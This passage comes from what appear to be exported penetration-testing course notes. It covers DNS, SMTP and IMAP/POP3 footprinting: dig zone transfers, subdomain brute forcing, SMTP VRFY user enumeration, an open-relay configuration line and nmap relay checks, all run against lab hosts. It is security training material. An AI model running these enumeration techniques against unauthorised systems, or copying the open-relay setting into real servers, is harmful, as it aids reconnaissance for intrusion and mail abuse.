of vulnerabilities targeting the BIND9 server can be found at [CVEdetails](https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64). In addition, SecurityTrails provides a short [list](https://web.archive.org/web/20250329174745/https://securitytrails.com/blog/most-popular-types-dns-attacks) of the most popular attacks on DNS servers.\n\nSome of the settings we can see below lead to these vulnerabilities, among others. Because DNS can get very complicated and it is very easy for errors to creep into this service, forcing an administrator to work around the problem until they find an exact solution. This often leads to elements being released so that parts of the infrastructure function as planned and desired. In such cases, functionality has a higher priority than security, which leads to misconfigurations and vulnerabilities.\n\n|**Option**|**Description**|\n|---|---|\n|`allow-query`|Defines which hosts are allowed to send requests to the DNS server.|\n|`allow-recursion`|Defines which hosts are allowed to send recursive requests to the DNS server.|\n|`allow-transfer`|Defines which hosts are allowed to receive zone transfers from the DNS server.|\n|`zone-statistics`|Collects statistical data of zones.|\n\n---\n\n## Footprinting the Service\n\nThe footprinting at DNS servers is done as a result of the requests we send. So, first of all, the DNS server can be queried as to which other name servers are known. We do this using the NS record and the specification of the DNS server we want to query using the `@` character. This is because if there are other DNS servers, we can also use them and query the records. However, other DNS servers may be configured differently and, in addition, may be permanent for other zones.\n\n#### DIG - NS Query\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128\n\n; <<>> DiG 9.16.1-Ubuntu <<>> ns inlanefreight.htb @10.129.14.128\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45010\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: ce4d8681b32abaea0100000061475f73842c401c391690c7 (good)\n;; QUESTION SECTION:\n;inlanefreight.htb.             IN      NS\n\n;; ANSWER SECTION:\ninlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.\n\n;; ADDITIONAL SECTION:\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\n\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:04:03 CEST 2021\n;; MSG SIZE  rcvd: 107\n```\n\nSometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command:\n\n#### DIG - Version Query\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig CH TXT version.bind 10.129.120.85\n\n; <<>> DiG 9.10.6 <<>> CH TXT version.bind\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47786\n;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; ANSWER SECTION:\nversion.bind.       0       CH      TXT     \"9.10.6-P1\"\n\n;; ADDITIONAL SECTION:\nversion.bind.       0       CH      TXT     \"9.10.6-P1-Debian\"\n\n;; Query time: 2 msec\n;; SERVER: 10.129.120.85#53(10.129.120.85)\n;; WHEN: Wed Jan 05 20:23:14 UTC 2023\n;; MSG SIZE  rcvd: 101\n```\n\nWe can use the option `ANY` to view all available records. This will cause the server to show us all available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown.\n\n#### DIG - ANY Query\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128\n\n; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.htb @10.129.14.128\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7649\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 2\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n; COOKIE: 064b7e1f091b95120100000061476865a6026d01f87d10ca (good)\n;; QUESTION SECTION:\n;inlanefreight.htb.             IN      ANY\n\n;; ANSWER SECTION:\ninlanefreight.htb.      604800  IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninlanefreight.htb.      604800  IN      TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninlanefreight.htb.      604800  IN      TXT     \"MS=ms97310371\"\ninlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.\n\n;; ADDITIONAL SECTION:\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\n\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:42:13 CEST 2021\n;; MSG SIZE  rcvd: 437\n```\n\n`Zone transfer` refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated `Asynchronous Full Transfer Zone` (`AXFR`). Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers. When changes are made, it must be ensured that all servers have the same data. Synchronization between the servers involved is realized by zone transfer. Using a secret key `rndc-key`, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.\n\nThe original data of a zone is located on a DNS server, which is called the `primary` name server for this zone. However, to increase the reliability, realize a simple load distribution, or protect the primary from attacks, one or more additional servers are installed in practice in almost all cases, which are called `secondary` name servers for this zone. For some `Top-Level Domains` (`TLDs`), making zone files for the `Second Level Domains` accessible on at least two servers is mandatory.\n\nDNS entries are generally only created, modified, or deleted on the primary. This can be done by manually editing the relevant zone file or automatically by a dynamic update from a database. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master.\n\nThe slave fetches the `SOA` record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.\n\n#### DIG - AXFR Zone Transfer\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128\n\n; <<>> DiG 9.16.1-Ubuntu <<>> axfr inlanefreight.htb @10.129.14.128\n;; global options: +cmd\ninlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninlanefreight.htb.      604800  IN      TXT     \"MS=ms97310371\"\ninlanefreight.htb.      604800  IN      TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninlanefreight.htb.      604800  IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.\napp.inlanefreight.htb.  604800  IN      A       10.129.18.15\ninternal.inlanefreight.htb. 604800 IN   A       10.129.1.6\nmail1.inlanefreight.htb. 604800 IN      A       10.129.18.201\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\ninlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 4 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:51:19 CEST 2021\n;; XFR size: 9 records (messages 1, bytes 520)\n```\n\nIf the administrator used a subnet for the `allow-transfer` option for testing purposes or as a workaround solution or set it to `any`, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.\n\n#### DIG - AXFR Zone Transfer - Internal\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128\n\n; <<>> DiG 9.16.1-Ubuntu <<>> axfr internal.inlanefreight.htb @10.129.14.128\n;; global options: +cmd\ninternal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninternal.inlanefreight.htb. 604800 IN   TXT     \"MS=ms97310371\"\ninternal.inlanefreight.htb. 604800 IN   TXT     \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninternal.inlanefreight.htb. 604800 IN   TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninternal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.\ndc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16\ndc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11\nmail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200\nns.internal.inlanefreight.htb. 604800 IN A      10.129.34.136\nvpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6\nws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34\nws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35\nwsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2\ninternal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 0 msec\n;; SERVER: 10.129.14.128#53(10.129.14.128)\n;; WHEN: So Sep 19 18:53:11 CEST 2021\n;; XFR size: 15 records (messages 1, bytes 664)\n```\n\nThe individual `A` records with the hostnames can also be found out with the help of a brute-force attack. To do this, we need a list of possible hostnames, which we use to send the requests in order. Such lists are provided, for example, by [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt).\n\nAn option would be to execute a `for-loop` in Bash that lists these entries and sends the corresponding query to the desired DNS server.\n\n#### Subdomain Brute Forcing\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n\nns.inlanefreight.htb.   604800  IN      A       10.129.34.136\nmail1.inlanefreight.htb. 604800 IN      A       10.129.18.201\napp.inlanefreight.htb.  604800  IN      A       10.129.18.15\n```\n\nMany different tools can be used for this, and most of them work in the same way. One of these tools is, for example [DNSenum](https://github.com/fwaeytens/dnsenum).\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb\n\ndnsenum VERSION:1.2.6\n\n-----   inlanefreight.htb   -----\n\n\nHost's addresses:\n__________________\n\n\n\nName Servers:\n______________\n\nns.inlanefreight.htb.                    604800   IN    A        10.129.34.136\n\n\nMail (MX) Servers:\n___________________\n\n\n\nTrying Zone Transfers and getting Bind Versions:\n_________________________________________________\n\nunresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 1.\n\nTrying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...\nAXFR record query failed: no nameservers\n\n\nBrute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:\n_______________________________________________________________________________________________________\n\nns.inlanefreight.htb.                    604800   IN    A        10.129.34.136\nmail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201\napp.inlanefreight.htb.                   604800   IN    A        10.129.18.15\nns.inlanefreight.htb.                    604800   IN    A        10.129.34.136\n\n...SNIP...\ndone.\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/11-SMTP",
    "path": "02_CPTS/03-Footprinting/11-SMTP.md",
    "title": "11 SMTP",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nThe `Simple Mail Transfer Protocol` (`SMTP`) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.\n\nBy default, SMTP servers accept connection requests on port `25`. However, newer SMTP servers also use other ports such as TCP port `587`. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network. At the beginning of the connection, authentication occurs when the client confirms its identity with a user name and password. The emails can then be transmitted. For this purpose, the client sends the server sender and recipient addresses, the email's content, and other information and parameters. After the email has been transmitted, the connection is terminated again. The email server then starts sending the email to another SMTP server.\n\nSMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port `25` for the encrypted connection, for example, TCP port `465`.\n\nAn essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as `Mail User Agent` (`MUA`), converts it into a header and a body and uploads both to the SMTP server. This has a so-called `Mail Transfer Agent` (`MTA`), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a `Mail Submission Agent` (`MSA`), which checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server. These are very important later on, as the so-called `Open Relay Attack` can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.\n\nOn arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the `Mail delivery agent` (`MDA`) transfers it to the recipient's mailbox.\n\n|Client (`MUA`)|`➞`|Submission Agent (`MSA`)|`➞`|Open Relay (`MTA`)|`➞`|Mail Delivery Agent (`MDA`)|`➞`|Mailbox (`POP3`/`IMAP`)|\n|---|---|---|---|---|---|---|---|---|\n\nBut SMTP has two disadvantages inherent to the network protocol.\n\n1. The first is that sending an email using SMTP does not return a usable delivery confirmation. Although the specifications of the protocol provide for this type of notification, its formatting is not specified by default, so that usually only an English-language error message, including the header of the undelivered message, is returned.\n    \n2. Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). Today, many different security techniques are used to prevent the misuse of SMTP servers. For example, suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol [DomainKeys](http://dkim.org/) (`DKIM`), the [Sender Policy Framework](https://dmarcian.com/what-is-spf/) (`SPF`).\n    \n\nFor this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP. ESMTP uses TLS, which is done after the `EHLO` command by sending `STARTTLS`. This initializes the SSL-protected SMTP connection, and from this moment on, the entire connection is encrypted, and therefore more or less secure. Now [AUTH PLAIN](https://www.samlogic.net/articles/smtp-commands-reference-auth.htm) extension for authentication can also be used safely.\n\n---\n\n## Default Configuration\n\nEach SMTP server can be configured in many ways, as can all other services. However, there are differences because the SMTP server is only responsible for sending and forwarding emails.\n\n#### Default Configuration\n\nSMTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/postfix/main.cf | grep -v \"#\" | sed -r \"/^\\s*$/d\"\n\nsmtpd_banner = ESMTP Server \nbiff = no\nappend_dot_mydomain = no\nreadme_directory = no\ncompatibility_level = 2\nsmtp_tls_session_cache_database = btree:${data_directory}/smtp_scache\nmyhostname = mail1.inlanefreight.htb\nalias_maps = hash:/etc/aliases\nalias_database = hash:/etc/aliases\nsmtp_generic_maps = hash:/etc/postfix/generic\nmydestination = $myhostname, localhost \nmasquerade_domains = $myhostname\nmynetworks = 127.0.0.0/8 10.129.0.0/16\nmailbox_size_limit = 0\nrecipient_delimiter = +\nsmtp_bind_address = 0.0.0.0\ninet_protocols = ipv4\nsmtpd_helo_restrictions = reject_invalid_hostname\nhome_mailbox = /home/postfix\n```\n\nThe sending and communication are also done by special commands that cause the SMTP server to do what the user requires.\n\n|**Command**|**Description**|\n|---|---|\n|`AUTH PLAIN`|AUTH is a service extension used to authenticate the client.|\n|`HELO`|The client logs in with its computer name and thus starts the session.|\n|`MAIL FROM`|The client names the email sender.|\n|`RCPT TO`|The client names the email recipient.|\n|`DATA`|The client initiates the transmission of the email.|\n|`RSET`|The client aborts the initiated transmission but keeps the connection between client and server.|\n|`VRFY`|The client checks if a mailbox is available for message transfer.|\n|`EXPN`|The client also checks if a mailbox is available for messaging with this command.|\n|`NOOP`|The client requests a response from the server to prevent disconnection due to time-out.|\n|`QUIT`|The client terminates the session.|\n\nTo interact with the SMTP server, we can use the `telnet` tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, `HELO` or `EHLO`.\n\n#### Telnet - HELO/EHLO\n\nSMTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server \n\n\nHELO mail1.inlanefreight.htb\n\n250 mail1.inlanefreight.htb\n\n\nEHLO mail1\n\n250-mail1.inlanefreight.htb\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n```\n\nThe command `VRFY` can be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue `code 252` and confirm the existence of a user that does not exist on the system. A list of all SMTP response codes can be found [here](https://serversmtp.com/smtp-error/).\n\n#### Telnet - VRFY\n\nSMTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server \n\nVRFY root\n\n252 2.0.0 root\n\n\nVRFY cry0l1t3\n\n252 2.0.0 cry0l1t3\n\n\nVRFY testuser\n\n252 2.0.0 testuser\n\n\nVRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\n252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa\n```\n\nTherefore, one should never entirely rely on the results of automatic tools. After all, they execute pre-configured commands, but none of the functions explicitly state how the administrator configures the tested server.\n\nSometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send would then look something like this: `CONNECT 10.129.14.128:25 HTTP/1.0`\n\nAll the commands we enter in the command line to send an email we know from every email client program like Thunderbird, Gmail, Outlook, and many others. We specify the `subject`, to whom the email should go, CC, BCC, and the information we want to share with others. Of course, the same works from the command line.\n\n#### Send an Email\n\nSMTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.129.14.128 25\n\nTrying 10.129.14.128...\nConnected to 10.129.14.128.\nEscape character is '^]'.\n220 ESMTP Server\n\n\nEHLO inlanefreight.htb\n\n250-mail1.inlanefreight.htb\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250-DSN\n250-SMTPUTF8\n250 CHUNKING\n\n\nMAIL FROM: <cry0l1t3@inlanefreight.htb>\n\n250 2.1.0 Ok\n\n\nRCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure\n\n250 2.1.5 Ok\n\n\nDATA\n\n354 End data with <CR><LF>.<CR><LF>\n\nFrom: <cry0l1t3@inlanefreight.htb>\nTo: <mrb3n@inlanefreight.htb>\nSubject: DB\nDate: Tue, 28 Sept 2021 16:32:51 +0200\nHey man, I am trying to access our XY-DB but the creds don't work. \nDid you make any changes there?\n.\n\n250 2.0.0 Ok: queued as 6E1CF1681AB\n\n\nQUIT\n\n221 2.0.0 Bye\nConnection closed by foreign host.\n```\n\nThe mail header is the carrier of a large amount of interesting information in an email. Among other things, it provides information about the sender and recipient, the time of sending and arrival, the stations the email passed on its way, the content and format of the message, and the sender and recipient.\n\nSome of this information is mandatory, such as sender information and when the email was created. Other information is optional. However, the email header does not contain any information necessary for technical delivery. It is transmitted as part of the transmission protocol. Both sender and recipient can access the header of an email, although it is not visible at first glance. The structure of an email header is defined by [RFC5322](https://datatracker.ietf.org/doc/html/rfc5322).\n\n---\n\n## Dangerous Settings\n\nTo prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.\n\nOften, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.\n\n#### Open Relay Configuration\n\nSMTP\n\n```shell-session\nmynetworks = 0.0.0.0/0\n```\n\nWith this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.\n\n---\n\n## Footprinting the Service\n\nThe default Nmap scripts include `smtp-commands`, which uses the `EHLO` command to list all possible commands that can be executed on the target SMTP server.\n\n#### Nmap\n\nSMTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -sC -sV -p25\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00025s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, \nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.09 seconds\n```\n\nHowever, we can also use the [smtp-open-relay](https://nmap.org/nsedoc/scripts/smtp-open-relay.html) NSE script to identify the target SMTP server as an open relay using 16 different tests. If we also print out the output of the scan in detail, we will also be able to see which tests the script is running.\n\n#### Nmap - Open Relay\n\nSMTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 02:29 CEST\nNSE: Loaded 1 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.00s elapsed\nInitiating ARP Ping Scan at 02:29\nScanning 10.129.14.128 [1 port]\nCompleted ARP Ping Scan at 02:29, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 02:29\nCompleted Parallel DNS resolution of 1 host. at 02:29, 0.03s elapsed\nInitiating SYN Stealth Scan at 02:29\nScanning 10.129.14.128 [1 port]\nDiscovered open port 25/tcp on 10.129.14.128\nCompleted SYN Stealth Scan at 02:29, 0.06s elapsed (1 total ports)\nNSE: Script scanning 10.129.14.128.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.07s elapsed\nNmap scan report for 10.129.14.128\nHost is up (0.00020s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n| smtp-open-relay: Server is an open relay (16/16 tests)\n|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>\n|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>\n|  MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.129.14.128]>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest%nmap.scanme.org@ESMTP>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest@nmap.scanme.org\">\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest%nmap.scanme.org\">\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@[10.129.14.128]>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<\"relaytest@nmap.scanme.org\"@[10.129.14.128]>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org@ESMTP>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@[10.129.14.128]:relaytest@nmap.scanme.org>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<@ESMTP:relaytest@nmap.scanme.org>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest>\n|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.129.14.128]>\n|_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP>\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nNSE: Script Post-scanning.\nInitiating NSE at 02:29\nCompleted NSE at 02:29, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.48 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/12-IMAP & POP3",
    "path": "02_CPTS/03-Footprinting/12-IMAP & POP3.md",
    "title": "12 IMAP & POP3",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails direc...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nWith the help of the `Internet Message Access Protocol` (`IMAP`), access to emails from a mail server is possible. Unlike the `Post Office Protocol` (`POP3`), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.\n\nClients access these structures online and can create local copies. Even across several clients, this results in a uniform database. Emails remain on the server until they are deleted. IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously. Without an active connection to the server, managing emails is impossible. However, some clients offer an offline mode with a local copy of the mailbox. The client synchronizes all offline local changes when a connection is reestablished.\n\nThe client establishes the connection to the server via port `143`. For communication, it uses text-based commands in `ASCII` format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.\n\nSMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent. Another advantage of the Internet Message Access Protocol is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage. However, the storage space requirement on the email server increases.\n\nWithout further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes. SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port `143` or an alternative port such as `993`.\n\n---\n\n## Default Configuration\n\nBoth IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages `dovecot-imapd`, and `dovecot-pop3d` using `apt` and play around with the configurations and experiment.\n\nIn the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/2.4.1/core/summaries/settings.html) and [service configuration](https://doc.dovecot.org/2.4.1/core/config/service.html) options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.\n\n#### IMAP Commands\n\n|**Command**|**Description**|\n|---|---|\n|`1 LOGIN username password`|User's login.|\n|`1 LIST \"\" *`|Lists all directories.|\n|`1 CREATE \"INBOX\"`|Creates a mailbox with a specified name.|\n|`1 DELETE \"INBOX\"`|Deletes a mailbox.|\n|`1 RENAME \"ToRead\" \"Important\"`|Renames a mailbox.|\n|`1 LSUB \"\" *`|Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`.|\n|`1 SELECT INBOX`|Selects a mailbox so that messages in the mailbox can be accessed.|\n|`1 UNSELECT INBOX`|Exits the selected mailbox.|\n|`1 FETCH <ID> all`|Retrieves data associated with a message in the mailbox.|\n|`1 CLOSE`|Removes all messages with the `Deleted` flag set.|\n|`1 LOGOUT`|Closes the connection with the IMAP server.|\n\n#### POP3 Commands\n\n|**Command**|**Description**|\n|---|---|\n|`USER username`|Identifies the user.|\n|`PASS password`|Authentication of the user using its password.|\n|`STAT`|Requests the number of saved emails from the server.|\n|`LIST`|Requests from the server the number and size of all emails.|\n|`RETR id`|Requests the server to deliver the requested email by ID.|\n|`DELE id`|Requests the server to delete the requested email by ID.|\n|`CAPA`|Requests the server to display the server 